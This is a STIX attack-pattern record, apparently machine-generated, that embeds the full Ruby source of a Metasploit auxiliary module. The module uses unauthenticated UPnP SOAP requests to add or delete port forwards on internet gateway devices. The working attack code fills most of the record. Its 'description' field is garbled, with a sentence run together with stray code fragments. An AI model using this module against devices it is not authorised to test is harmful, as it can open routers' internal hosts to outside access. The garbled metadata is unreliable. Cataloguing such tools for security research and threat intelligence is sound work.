{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e9a0c67-dccb-40e3-bc97-3c1cf5b9d691",
    "created": "2024-08-14T16:22:46.614153Z",
    "modified": "2024-08-14T16:22:46.614157Z",
    "name": "UPnP IGD SOAP Port Mapping Utility",
    "description": "Use the DeletePortMapping SOAP command to remove a port forwarding 'SOAP_ACTION' => 'DeletePortMapping'  ] ] )  register_options( [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/upnp/soap_portmapping.rb",
            "external_id": "soap_portmapping.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "http://www.upnp-hacks.org/igd.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name'           => 'UPnP IGD SOAP Port Mapping Utility',\n      'Description'    => %q{\n        Manage port mappings on UPnP IGD-capable device using the AddPortMapping and\n        DeletePortMapping SOAP requests\n      },\n      'Author'         =>\n        [\n          'St0rn <fabien[at]anbu-pentest.com>', # initial module\n          'Jon Hart <jon_hart[at]rapid7.com>'   # module cleanup and refactoring\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     => [['URL', 'http://www.upnp-hacks.org/igd.html']],\n      'DefaultAction'  => 'ADD',\n      'Actions'        =>\n        [\n          [ 'ADD',\n            {\n              'Description' => 'Use the AddPortMapping SOAP command to open and forward a port',\n              'SOAP_ACTION' => 'AddPortMapping'\n            }\n          ],\n          [ 'DELETE',\n            {\n              'Description' => 'Use the DeletePortMapping SOAP command to remove a port forwarding',\n              'SOAP_ACTION' => 'DeletePortMapping'\n            }\n          ]\n        ],\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'UPnP control URL', '/' ]),\n        OptAddress.new('INTERNAL_CLIENT', [false, 'Internal client hostname/IP']),\n        OptAddress.new('EXTERNAL_CLIENT', [false, 'External client hostname/IP']),\n        OptEnum.new('PROTOCOL', [true, 'Transport level protocol to map', 'TCP', %w(TCP UDP)]),\n        OptInt.new('INTERNAL_PORT', [false, 'Internal port']),\n        OptInt.new('EXTERNAL_PORT', [true, 'External port']),\n        OptInt.new('LEASE_DURATION', [false, 'Lease time for mapping, in seconds', 3600])\n      ],\n      self.class\n    )\n  end\n\n  def internal_port\n    @internal_port ||= datastore['INTERNAL_PORT']\n  end\n\n  def internal_client\n    @internal_client ||= datastore['INTERNAL_CLIENT']\n  end\n\n  def external_port\n    @external_port ||= datastore['EXTERNAL_PORT']\n  end\n\n  def external_client\n    @external_client ||= datastore['EXTERNAL_CLIENT']\n  end\n\n  def lease_duration\n    @lease_duration ||= datastore['LEASE_DURATION']\n  end\n\n  def protocol\n    @protocol ||= datastore['PROTOCOL']\n  end\n\n  def soap_action\n    @soap_action ||= action.opts['SOAP_ACTION']\n  end\n\n  def build_soap\n    builder = ::Nokogiri::XML::Builder.new do |xml|\n      xml['SOAP-ENV'].Envelope('xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope', 'SOAP-ENV:encodingStyle' => 'http://schemas.xmlsoap.org/soap/encoding/') do\n        xml['SOAP-ENV'].Body do\n          xml['m'].send(soap_action, 'xmlns:m' => 'urn:schemas-upnp-org:service:WANIPConnection:1') do\n            case action.name\n            when 'ADD'\n              xml.NewPortMappingDescription(Rex::Text.rand_text_alpha(8)) { xml.parent.namespace = nil }\n              xml.NewLeaseDuration(lease_duration) { xml.parent.namespace = nil }\n              xml.NewInternalClient(internal_client) { xml.parent.namespace = nil }\n              xml.NewEnabled(1) { xml.parent.namespace = nil }\n              xml.NewExternalPort(external_port) { xml.parent.namespace = nil }\n              xml.NewRemoteHost(external_client) { xml.parent.namespace = nil }\n              xml.NewProtocol(protocol) { xml.parent.namespace = nil }\n              xml.NewInternalPort(internal_port) { xml.parent.namespace = nil }\n            when 'DELETE'\n              xml.NewExternalPort(external_port) { xml.parent.namespace = nil }\n              xml.NewRemoteHost(external_client) { xml.parent.namespace = nil }\n              xml.NewProtocol(protocol) { xml.parent.namespace = nil }\n            end\n          end\n        end\n      end\n    end\n    builder.to_xml\n  end\n\n  def run\n    res = send_request_cgi(\n      'uri'           => normalize_uri(target_uri.path),\n      'method'        => 'POST',\n      'content-type'  => 'text/xml;charset=\"utf-8\"',\n      'data'          => build_soap,\n      'headers'       => {\n        'SoapAction'  => \"urn:schemas-upnp-org:service:WANIPConnection:1##{soap_action}\"\n      }\n    )\n\n    external_map = \"#{external_client ? external_client : 'any'}:#{external_port}/#{protocol}\"\n    internal_map = \"#{internal_client ? internal_client : 'any'}:#{internal_port}/#{protocol}\"\n    map = \"#{external_map} -> #{internal_map}\"\n\n    if res\n      if res.code == 200\n        print_good(\"#{peer} #{map} #{action.name} succeeded\")\n      else\n        print_error(\"#{peer} #{map} #{action.name} failed with response code #{res.code}\")\n        vprint_status(\"#{res.body}\")\n      end\n    else\n      print_error(\"#{peer} no response for #{map} #{action.name}\")\n    end\n  end\nend\n"
}